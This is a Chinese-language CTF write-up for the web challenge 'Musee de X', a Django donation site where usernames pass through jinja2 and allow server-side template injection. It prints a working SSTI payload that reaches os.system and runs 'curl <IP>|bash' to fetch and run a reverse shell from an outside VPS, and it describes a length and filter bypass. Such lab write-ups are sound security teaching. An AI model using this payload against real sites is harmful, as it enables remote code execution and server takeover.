# Musee de X

> 分类：Web

## 题目描述

Django 搭建的捐赠网站，Debug 未关。用户名被带入 jinja2 模板渲染，存在 jinja2 SSTI。

## 考察知识点

- jinja2 模板注入（SSTI）
- Django Debug 信息泄露

## 解法

1. 注册、登录、捐赠（url 随意填），报错信息显示是 jinja2 模板，且用户名被带入 `Template(text).render()` 渲染 → jinja2 SSTI。

2. 注册用户名为 `{{10+50}}`，捐赠图片后发现用户名被计算（显示 60），确认注入。

3. 注册含 SSTI payload 的用户名（要求注册用户名和捐赠用户名一致），触发 RCE。

**方法一（反弹 shell）**：VPS 开 http 服务，index 放反弹 shell 指令，注册 exp：

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{c.__init__.func_globals['linecache'].__dict__['os'].system('curl 139.199.206.219|bash') }}{% endif %}{% endfor %}
```

**方法二（长度限制 + `/` 过滤绕过）**：把反弹 shell 语句 base64 后逐字写入文件再执行（脚本见 Pr0ph3t 博客）。

## 参考答案

（flag 通过 SSTI 反弹 shell 后读取）

## 来源

- 作者：Pr0ph3t | https://blog.pr0ph3t.com/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/
- 作者：烟敛寒林o | https://blog.csdn.net/dyw_666666/article/details/89874060
